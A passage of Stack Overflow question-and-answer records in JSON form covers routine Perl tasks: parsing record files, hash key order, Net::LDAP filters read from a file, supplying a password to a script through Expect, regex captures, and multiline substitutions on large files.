'animals.dat';\n\nopen(my $fh, \"&lt;\", $animal1) || die \"Could not open file $animal1: $!\\n\";\n\nlocal $/ = '';\n\nwhile (&lt;$fh&gt;) {\n  my $animal = parse_animal($_);\n  say Dumper $animal;\n}\n\nsub parse_animal {\n  ...\n}\n</code></pre>\n\n<p>We're using <a href=\"https://metacpan.org/pod/Data::Dumper\" rel=\"nofollow noreferrer\">Data::Dumper</a> here to see what you get back from the subroutine. I get this:</p>\n\n<pre><code>$VAR1 = {\n          'loc' =&gt; 'Area1',\n          'id' =&gt; 'Animal1',\n          'simil' =&gt; '15/20'\n        };\n\n$VAR1 = {\n          'simil' =&gt; '19/20',\n          'id' =&gt; 'Animal2',\n          'loc' =&gt; 'Area2'\n        };\n\n$VAR1 = {\n          'simil' =&gt; '13/20',\n          'id' =&gt; 'Animal3',\n          'loc' =&gt; 'Area3'\n        };\n</code></pre>\n\n<p>So we can see that a) we're parsing the data correctly and b) the data for each animal is staying together in a single hash.</p>\n\n<p>So what to actually to with the data we get back? Well, there are (at least!) a couple of options. And which to choose depends on what you want your program to do.</p>\n\n<p>If you want to process information about the animals in the order that they appear in the input file, then it makes sense to store them in an array.</p>\n\n<pre><code>my @animals;\n\nwhile (&lt;$fh&gt;) {\n  push @animals, parse_animal($_);\n}\n\nfor (@animals) {\n  say \"The $_-&gt;{id} is found in $_-&gt;{loc} and is $_-&gt;{simil} similar\";\n}\n</code></pre>\n\n<p>Another option might be to store them in a hash (keyed, perhaps, by ID):</p>\n\n<pre><code>my %animals;\n\nwhile (&lt;$fh&gt;) {\n  my $animal = parse_animal($_);\n  $animals{$animal-&gt;{id}} = $animal;\n}\n\nsay Dumper \\%animals;\n</code></pre>\n\n<p>But hopefully, this has given you enough information to get you unstuck.</p>\n"}, {"tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 4, "last_activity_date": 1569508223, "creation_date": 1569508223, "answer_id": 58119092, "question_id": 58116869, "link": "https://stackoverflow.com/questions/58116869/problems-with-output-order-after-returning-multiple-values-through-a-subroutine/58119092#58119092", "title": "Problems with output order after returning multiple values through a subroutine in Perl", "body": "<blockquote>\n  <p>My command however makes messes the output order completely. Any ideas about what error in my code might be causing this?</p>\n</blockquote>\n\n<p>It's not an error in your code (though do heed the suggestions from Dave Cross). It's an error in your understanding about Perl's hash variable type and the <code>keys</code> function. The hash type is unordered, and there is no guarantee what order the hash keys will be returned to you in the <code>keys</code> function. To return them in a particular order (say, the order they are encountered in your input file), you will have to keep track of it yourself.</p>\n\n<pre><code>my (%seen,@order);\nsub parse_key_file {\n    if($_ =~ /Id:\\s+(\\S+)/){\n        $id= $1;\n        if (!$seen{$id}++) {\n            push @order, $id;\n        }\n        next;\n    }\n    ...\n}\n\nforeach $animal (@order) {\n    print \"The $animal is found in $loc{$animal} and is $simil{$animal} similar\\n\";\n}\n</code></pre>\n\n<p>There is also a module called <a href=\"http://metacpan.org/pod/Tie::IxHash\" rel=\"nofollow noreferrer\"><code>Tie::IxHash</code></a> that provides hash variables that retain the order input of their keys, when you are ready to use Perl modules.</p>\n"}], "owner": {"reputation": 89, "user_id": 8826834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7TkaH.jpg?s=128&g=1", "display_name": "Aletia", "link": "https://stackoverflow.com/users/8826834/aletia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1569829122, "creation_date": 1569501081, "last_edit_date": 1569829122, "question_id": 58116869, "link": "https://stackoverflow.com/questions/58116869/problems-with-output-order-after-returning-multiple-values-through-a-subroutine", "title": "Problems with output order after returning multiple values through a subroutine in Perl", "body": "<p>I am having a bit of a problem figuring out how to correctly syntax a subroutine that returns multiple values. Say we have a file that has the below format from which I want to parse the values:</p>\n\n<pre><code>Id: Animal1\nLoc: Area1\nSimilarity: 15/20\n\nId: Animal2\nLoc: Area2\nSimilarity: 19/20\n\nId: Animal3\nLoc: Area3\nSimilarity: 13/20\n</code></pre>\n\n<p>Since I have a couple of files I want to run in the same script, I wanted to read them in in the form of a subroutine. My command however messes up the output order completely. Any ideas about what error in my code might be causing this?</p>\n\n<p>Here is the code that works when not in the subroutine format, starting after I open the file: </p>\n\n<pre><code>open($fh, \"&lt;\", $animal1) || die \"Could not open file $animal1/n $!\";\n\nwhile (&lt;$fh&gt;) {\n    chomp;\n    if($_ =~ /Id:\\s+(\\S+)/){\n        $id= $1;\n\n    }\n    if($_ =~ /Loc:\\s+(\\S+)/){\n        $loc{$id}= $1;\n    }\n    if($_ =~ /Similarity:\\s+(\\S+)/){\n        $simil{$id}= $1;\n    }\n}\n\nforeach $id(keys %loc){\n    print \"The $animal is found in $loc{$animal} and is $simil{$animal} similar\\n\";\n}\nclose $fh;\n</code></pre>\n\n<p>The code in question: </p>\n\n<pre><code>open($fh, \"&lt;\", $animal1) || die \"Could not open file $animal1/n $!\\n\";\n\nwhile (&lt;$fh&gt;) {\n    chomp;\n    ($animal, $loc{$animal}, $simil{$animal})= parse_key_file($_);\n}\n\nforeach $animal(keys %loc){\n    print \"The $animal is found in $loc{$animal} and is $simil{$animal} similar\\n\";\n}\n\nsub parse_key_file {\n    if($_ =~ /Id:\\s+(\\S+)/){\n        $id= $1;\n        next;\n    }\n    if($_ =~ /Loc:\\s+(\\S+)/){\n        $loc{$id}= $1;\n        next;\n    }\n    if($_ =~ /Similarity:\\s+(\\S+)/){\n        $simil{$id}= $1;\n        next;\n    }\n    return ($id, $loc{$id}, $simil{$id});\n}\n</code></pre>\n\n<p>Thank you !\nA.</p>\n"}, {"tags": ["perl", "ldap", "netldap"], "answers": [{"comments": [{"owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "edited": false, "score": 0, "creation_date": 1569512225, "post_id": 58116890, "comment_id": 102629346, "body": "thanks, thats what i thought, will try both of the solutions and see what happens. as my input is quite huge i&#39;m not sure it will accept the filter, i guess the loop solution is cleaner. will compare the speeds as well"}], "tags": [], "owner": {"reputation": 5616, "user_id": 2529954, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ShWjR.jpg?s=128&g=1", "display_name": "EricLavault", "link": "https://stackoverflow.com/users/2529954/ericlavault"}, "is_accepted": true, "score": 0, "last_activity_date": 1569501837, "last_edit_date": 1569501837, "creation_date": 1569501130, "answer_id": 58116890, "question_id": 58115567, "link": "https://stackoverflow.com/questions/58115567/use-file-for-filter-in-perl-netldap/58116890#58116890", "title": "use file for filter in Perl Net::LDAP", "body": "<p>It seems that <code>ldapsearch -f</code> option is not implemented in Perl Net::LDAP, but you can still do the exact equivalent that is : performing a search operation for each line read from an input file : </p>\n\n<pre><code>open $handle, '&lt;', $filepath;\nchomp(@lines = &lt;$handle&gt;);\nclose $handle;\n\nforeach $cn (@lines) {\n  $data = $ldap-&gt;search(\n     base   =&gt; $dn,\n     scope  =&gt; 'one',\n     pagesize  =&gt; '999',\n     filter =&gt; \"(cn=$cn)\",\n     attrs  =&gt; [ qw( displayName cn ) ]\n  );\n  ...\n}\n</code></pre>\n\n<p>You can also avoid the foreach loop and still get the same results in one single query by concatenating the attribute values in a OR filter : </p>\n\n<pre><code>$filter = '(|(cn=' . join(')(cn=', @lines) . '))';\n</code></pre>\n"}], "owner": {"reputation": 628, "user_id": 4279387, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/yEPjV.png?s=128&g=1", "display_name": "olivierg", "link": "https://stackoverflow.com/users/4279387/olivierg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 58116890, "answer_count": 1, "score": 0, "last_activity_date": 1569501837, "creation_date": 1569496403, "last_edit_date": 1569496710, "question_id": 58115567, "link": "https://stackoverflow.com/questions/58115567/use-file-for-filter-in-perl-netldap", "title": "use file for filter in Perl Net::LDAP", "body": "<p>when i'm doing an LDAPsearch manually on the commandline, i can do it so that the filter attribute can come off a file like this :</p>\n\n<pre><code>ldapsearch -v -h &lt;host&gt; -D \"&lt;DN&gt;\" -b \"OU=myou,DC=mydc\" -f myqueries.txt \"(cn=%s)\"\n</code></pre>\n\n<p><strong>myqueries.txt</strong> contains entries such as :</p>\n\n<pre><code>name1\nname2\nnameN\n</code></pre>\n\n<p>now i'm trying to do the same thing in Perl using <strong>Net::LDAP</strong> and i couldn't find any option like that in the documentation.\ndo you know if it can do it ?</p>\n\n<p>in the worst case, i know that i can probably create an array of records (containing queries) and make a loop with many ldapsearches on these names, it will work, but i'd prefer doing something easier with a net::ldap attribute if it is possible (less code)</p>\n\n<p>e.g.</p>\n\n<pre><code>$data = $ldap-&gt;search(\n     base   =&gt; $dn,\n     scope  =&gt; 'one',\n     pagesize  =&gt; '999',\n     filter =&gt; '(cn=%s)',\n     file =&gt; 'myqueries.txt',                # this option does not exist\n     attrs  =&gt; [ qw( displayName cn ) ]\n  );\n</code></pre>\n\n<p>thanks !</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1569488467, "post_id": 58113141, "comment_id": 102615952, "body": "How does the Perl script read the password?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1569488709, "post_id": 58113141, "comment_id": 102616083, "body": "What have you tried? Show us your code."}, {"owner": {"reputation": 3, "user_id": 12120069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002731692d019f09b6c306a9b71f4171?s=128&d=identicon&r=PG&f=1", "display_name": "spudnik267", "link": "https://stackoverflow.com/users/12120069/spudnik267"}, "edited": false, "score": 0, "creation_date": 1569488787, "post_id": 58113141, "comment_id": 102616123, "body": "Perl script is vendor supplied and I cannot determine how it reads the password"}, {"owner": {"reputation": 3, "user_id": 12120069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002731692d019f09b6c306a9b71f4171?s=128&d=identicon&r=PG&f=1", "display_name": "spudnik267", "link": "https://stackoverflow.com/users/12120069/spudnik267"}, "edited": false, "score": 0, "creation_date": 1569488984, "post_id": 58113141, "comment_id": 102616231, "body": "I have tried $var | Perl perlscript.pl and value | Perl perlscript.pl"}, {"owner": {"reputation": 3, "user_id": 12120069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002731692d019f09b6c306a9b71f4171?s=128&d=identicon&r=PG&f=1", "display_name": "spudnik267", "link": "https://stackoverflow.com/users/12120069/spudnik267"}, "edited": false, "score": 0, "creation_date": 1569492641, "post_id": 58113141, "comment_id": 102618271, "body": "Also tried perl perlscript.pl &lt;&lt; ANSWERS $var ANSWERS and echo $var | perl perlscript.pl and echo $(derive password) | perl perlscript.pl"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1569496137, "post_id": 58113141, "comment_id": 102620110, "body": "What&#39;s your question?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1569500183, "post_id": 58113141, "comment_id": 102622297, "body": "@spudnik267: As you can see, putting code in comments isn&#39;t very helpful. Please <a href=\"https://stackoverflow.com/posts/58113141/edit\">edit your question</a> to add your example code."}], "answers": [{"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 1, "last_activity_date": 1571769233, "last_edit_date": 1592644375, "creation_date": 1571769233, "answer_id": 58510404, "question_id": 58113141, "link": "https://stackoverflow.com/questions/58113141/perl-script-prompts-for-password-but-does-not-accept-input-from-ksh/58510404#58510404", "title": "Perl script prompts for password but does not accept input from ksh", "body": "<blockquote>\n<p>I have tried <code>$var | Perl perlscript.pl</code> and <code>value | Perl perlscript.pl</code> \u2013 spudnik267 Sep 26 at 9:09</p>\n<p>Also tried <code>perl perlscript.pl &lt;&lt; ANSWERS $var ANSWERS</code> and <code>echo $var | perl perlscript.pl</code> and <code>echo $(derive password) | perl perlscript.pl</code> \u2013 spudnik267 Sep 26 at 10:10</p>\n</blockquote>\n<p>Passwords are often not read from STDIN. Instead, they are read directly from the <a href=\"https://en.wikipedia.org/wiki/Pseudoterminal\" rel=\"nofollow noreferrer\">psuedoterminal or PTY</a>. This means it's reading from the controlling terminal program, not from STDIN. This is an obsolete security measure meant to make automating filling in passwords harder. To a cracker it's a speed bump, but it's very inconvenient to everyone else.</p>\n<p>Here's a simple program echoing input from the PTY.</p>\n<pre><code>open my $fh, &quot;/dev/tty&quot; or die $!;\nprint while &lt;$fh&gt;;\n</code></pre>\n<p>This program will not see input piped to STDIN. It will only see what you type on the terminal.</p>\n<p>There are various ways to talk to a program's PTY. One of the most powerful is to use <a href=\"https://metacpan.org/pod/Expect\" rel=\"nofollow noreferrer\">Expect</a>.</p>\n<pre><code>#!/usr/bin/env perl\n  \nuse Expect;\n\nmy $exp = Expect-&gt;spawn(&quot;perl tty.pl&quot;) or die $!;\n$exp-&gt;send(&quot;test\\n&quot;);\n$exp-&gt;soft_close();\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 12120069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002731692d019f09b6c306a9b71f4171?s=128&d=identicon&r=PG&f=1", "display_name": "spudnik267", "link": "https://stackoverflow.com/users/12120069/spudnik267"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 58510404, "answer_count": 1, "score": 0, "last_activity_date": 1573132345, "creation_date": 1569488383, "last_edit_date": 1573132345, "question_id": 58113141, "link": "https://stackoverflow.com/questions/58113141/perl-script-prompts-for-password-but-does-not-accept-input-from-ksh", "title": "Perl script prompts for password but does not accept input from ksh", "body": "<p>I am trying to create a ksh wrapper script that retrieves a password then calls a perl script, but the perl script thinks that only enter was pressed so keeps prompting.</p>\n\n<p>I cannot change the perl script.</p>\n\n<p>I created a stub Perl script that prompts for input and it accepts that from the wrapper. I have tried <code>$var | Perl perlscript.pl</code> and <code>value | Perl perlscript.pl</code>. Also tried <code>perl perlscript.pl &lt;&lt; ANSWERS $var ANSWERS</code> and <code>echo $var | perl perlscript.pl</code> and <code>echo $(derive password) | perl perlscript.pl</code>.</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 3, "last_activity_date": 1569488410, "creation_date": 1569488410, "answer_id": 58113153, "question_id": 58112890, "link": "https://stackoverflow.com/questions/58112890/perl-iterate-over-the-number-of-regexp-matches/58113153#58113153", "title": "Perl iterate over the number of regexp matches", "body": "<p>Do it in two steps. First, match the whole contents of <code>{...}</code>, then use <a href=\"http://p3rl.org/split\" rel=\"nofollow noreferrer\">split</a> to retrieve the individual elements.</p>\n\n<p>BTW, you don't have to backslash spaces (unless you use the <code>/x</code> modifier).</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse feature qw{ say };\n\nmy $string = 'int foo[] = { a, b, c, d, e };';\n\nmy ($array, $elements) = $string =~ /^ *int *([a-z]+) *\\[\\] *= *\\{ *((?:[a-z]+ *,? *)+)\\};/;\nmy @elements = split /[, ]+/, $elements;\n\nsay \"&lt;$_&gt;\" for $array, @elements;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": false, "score": 1, "last_activity_date": 1569491635, "creation_date": 1569491635, "answer_id": 58114172, "question_id": 58112890, "link": "https://stackoverflow.com/questions/58112890/perl-iterate-over-the-number-of-regexp-matches/58114172#58114172", "title": "Perl iterate over the number of regexp matches", "body": "<p>When you find regexes too limiting, use a real C parser.</p>\n\n<pre><code>use MarpaX::Languages::C::Scan qw();\nmy $ast = MarpaX::Languages::C::Scan-&gt;new(\n    content =&gt; 'int foo[] = { a, b, c, d, e };'\n)-&gt;ast;\nfor my $id (\n    $ast-&gt;findnodes('//declarator//IDENTIFIER'),\n    $ast-&gt;findnodes('//initializerList//IDENTIFIER')\n) {\n    say $id-&gt;getAttribute('text');\n}\n__END__\nfoo\na\nb\nc\nd\ne\n</code></pre>\n"}], "owner": {"reputation": 300, "user_id": 3337196, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d9559adf3cec6806c417d5aae1c7a85b?s=128&d=identicon&r=PG&f=1", "display_name": "clem steredenn", "link": "https://stackoverflow.com/users/3337196/clem-steredenn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "accepted_answer_id": 58113153, "answer_count": 2, "score": 1, "last_activity_date": 1569491635, "creation_date": 1569487476, "question_id": 58112890, "link": "https://stackoverflow.com/questions/58112890/perl-iterate-over-the-number-of-regexp-matches", "title": "Perl iterate over the number of regexp matches", "body": "<p>I have some lines like</p>\n\n<pre><code>int foo[] = { a, b, c, d, e };\n</code></pre>\n\n<p>The exact numbers of elements in the array is unknown. I want to match it using <code>perl</code>'s regexp. I identify the lines using</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>if ( $line =~ /^\\ *int\\ *([a-z]+)\\ *\\[\\]\\ *=\\ *{(\\ *([a-z]+)\\ *,?)+}\\ *;/ )\n{\n  print $line;\n}\n</code></pre>\n\n<p><strong>How can I get the number of matches, as I want to work on each of the elements in the array?</strong></p>\n\n<p>Ideally, I would like something like</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>if ( $line =~ /^\\ *int\\ *([a-z]+)\\ *\\[\\]\\ *=\\ *{(\\ *([a-z]+)\\ *,?)+}\\ *;/ )\n{\n  my $count_of_matches = ??????\n  for (my $matches=0 ; $matches&lt;count_of_matches ; $matches++)\n  {\n    print $matches, \"\\n\";\n  }\n}\n</code></pre>\n\n<p>which should result in something like</p>\n\n<pre><code>foo\na\nb\nc\nd\ne\n</code></pre>\n\n<p>I tried</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>my $count_of_matches = () = $line =~ /.../ # using the same pattern as above\n\nmy @list  = $line =~ /.../\nmy $other_count_of_matches = scalar @list\n</code></pre>\n\n<p>But I get a count of 3, and the <code>perl</code> array only contains the array name (<code>foo</code>) and twice the last element (<code>e</code>).</p>\n"}, {"tags": ["bash", "perl", "awk", "sed"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569467133, "post_id": 58108791, "comment_id": 102608128, "body": "I am not sure of the exact problem statement in all that -- So: <i>if a line ends in comma and the next one starts in <code>)</code></i> then remove the comma, otherwise do nothing. Is that a full statement of the problem?"}, {"owner": {"reputation": 3014, "user_id": 987074, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/rWIWG.jpg?s=128&g=1", "display_name": "bdx", "link": "https://stackoverflow.com/users/987074/bdx"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569467190, "post_id": 58108791, "comment_id": 102608142, "body": "Yes, that&#39;s correct."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1569467938, "post_id": 58108791, "comment_id": 102608279, "body": "Can the lines with an open paren also end in a comma?"}, {"owner": {"reputation": 3014, "user_id": 987074, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/rWIWG.jpg?s=128&g=1", "display_name": "bdx", "link": "https://stackoverflow.com/users/987074/bdx"}, "edited": false, "score": 0, "creation_date": 1569468011, "post_id": 58108791, "comment_id": 102608294, "body": "Lines containing an opening parenthesis and/or closing parenthesis can also end in a comma."}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1569470060, "post_id": 58108791, "comment_id": 102608658, "body": "Just want to understand: So you are only interested in instances of <code>,\\n)</code> in the file, and you want to convert all of those to <code>\\n)</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 2414, "user_id": 5379657, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ab4a9ac2ee2c7a27f5d976d6a787970?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Y", "link": "https://stackoverflow.com/users/5379657/jeff-y"}, "edited": false, "score": 0, "creation_date": 1569586229, "post_id": 58109535, "comment_id": 102655328, "body": "Won\u2019t this fail to print the last line if it ends in a comma?"}, {"owner": {"reputation": 3014, "user_id": 987074, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/rWIWG.jpg?s=128&g=1", "display_name": "bdx", "link": "https://stackoverflow.com/users/987074/bdx"}, "edited": false, "score": 0, "creation_date": 1569815554, "post_id": 58109535, "comment_id": 102704637, "body": "Thank you for the thorough explanation, this has done exactly what I was after and tested well on the full-size file."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3014, "user_id": 987074, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/rWIWG.jpg?s=128&g=1", "display_name": "bdx", "link": "https://stackoverflow.com/users/987074/bdx"}, "edited": false, "score": 0, "creation_date": 1569818589, "post_id": 58109535, "comment_id": 102705116, "body": "@bdx You are welcome. Let me know if questions come up"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 4, "last_activity_date": 1569602431, "last_edit_date": 1569602431, "creation_date": 1569471886, "answer_id": 58109535, "question_id": 58108791, "link": "https://stackoverflow.com/questions/58108791/multiline-perl-regex-replace-on-large-file-without-slurp/58109535#58109535", "title": "Multiline perl regex replace on large file without slurp", "body": "<p>A fairly direct logic: </p>\n\n<ul>\n<li><p>print a line unless it ends with a comma (need to check on the next line, perhaps remove it)</p></li>\n<li><p>print the previous line (<code>$p</code>) if it had a comma, without it if the current line starts with <code>)</code></p></li>\n</ul>\n\n<p>\n\n<pre><code>perl -ne'\n    if ($p =~ /,$/) { $p =~ s/,$// if /^\\s*\\)/; print $p }; \n    print unless /,$/; \n    $p = $_\n' file\n</code></pre>\n\n<p>Efficiency of this can be improved some, by losing one regex (so engine startup overhead goes) and some data copy but at the expense of clumsier code, having additional logic and checks.</p>\n\n<p>Tested with <code>file</code></p>\n\n<pre>\nhello\nhere's a comma,\nwhich was fine\n(but here's another,\n) which has to go,\nand that was another good one.\nend\n</pre>\n\n<hr>\n\n<p>The above fails to print the last line if it ends in a comma.  One fix for that is to check our buffer (previous line <code>$p</code>) in an <a href=\"https://perldoc.perl.org/perlmod.html#BEGIN%2c-UNITCHECK%2c-CHECK%2c-INIT-and-END\" rel=\"nofollow noreferrer\"><code>END</code> block</a>, so to add at the end</p>\n\n<pre><code>END { print $p if $p =~ /,$/}\n</code></pre>\n\n<p>This is a fairly usual way to check for trailing buffers or conditions in <code>-n</code>/<code>-p</code> one-liners.</p>\n\n<p>Another fix, less efficient but with perhaps cleaner code, is to replace the statement</p>\n\n<pre><code>print unless /,$/;\n</code></pre>\n\n<p>with</p>\n\n<pre><code>print if (not /,$/ or eof);\n</code></pre>\n\n<p>This does run an <code>eof</code> check on every line of the file, while <code>END</code> runs <em>once</em>.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1569472469, "post_id": 58109602, "comment_id": 102609143, "body": "Nice idea but may end up reading <i>huge</i> chunks (or even whole file) ..."}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1569472500, "post_id": 58109602, "comment_id": 102609147, "body": "Yes, it does make that assumption. But on the other hand, <code>\\n</code> as a record separator makes assumptions about line length."}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1569472669, "post_id": 58109602, "comment_id": 102609194, "body": "Again, I agree that this will read records as large as the span between occurrences of <code>,\\n)</code>. I&#39;ll mention that in the answer. However, although we&#39;re told in the OP&#39;s question that the file is large, we&#39;re not told whether the trigger sequence is sparse. If it is, yes, this could be problematic the same way that a file with huge lines could be problematic. We are most likely reading larger chunks than we would if we split only on newline."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569472875, "post_id": 58109602, "comment_id": 102609248, "body": "For me the only problem is unpredictability: what if the file has no such sequence (or very few) and the program gets killed?"}], "tags": [], "owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "is_accepted": false, "score": 2, "last_activity_date": 1569508570, "last_edit_date": 1569508570, "creation_date": 1569472366, "answer_id": 58109602, "question_id": 58108791, "link": "https://stackoverflow.com/questions/58108791/multiline-perl-regex-replace-on-large-file-without-slurp/58109602#58109602", "title": "Multiline perl regex replace on large file without slurp", "body": "<p>If using <code>\\n</code> newline as a record separator is awkward, use something else. In this case you're specifically interested in the sequence <code>,\\n)</code>, and we can let Perl find that for us as we read the file:</p>\n\n<pre><code>perl -pe 'BEGIN{ $/ = \",\\n)\" } s/,\\n\\)/\\n)/' input.txt &gt;output.txt\n</code></pre>\n\n<p>This portion: <code>$/ = \",\\n)\"</code> tells Perl that instead of iterating over lines of the file, it should iterate over records that terminate with the sequence <code>,\\n)</code>. That helps us to assure that every chunk will have at most one such sequence, but more importantly, that this sequence will not span chunks (or records, or file-reads). Every chunk read will either end in <code>,\\n)</code> or in the case of the final record, may end not have a record terminator (by our definition of terminator).</p>\n\n<p>Next we just use substitution to eliminate that comma in our <code>,\\n)</code> record separator sequence.</p>\n\n<p>The key here really is that by setting the record separator to the very sequence we're interested in, we guarantee the sequence will not get broken across file-reads.</p>\n\n<p>As has been mentioned in the comments, this solution is most useful only if the span between <code>,\\n)</code> sequences doesn't exceed the amount of memory you are willing to throw at the problem.  It is most likely that newlines themselves occur in the file more often than <code>,\\n)</code> sequences, and so, this will read in larger chunks.  You know your data set better than we do, and 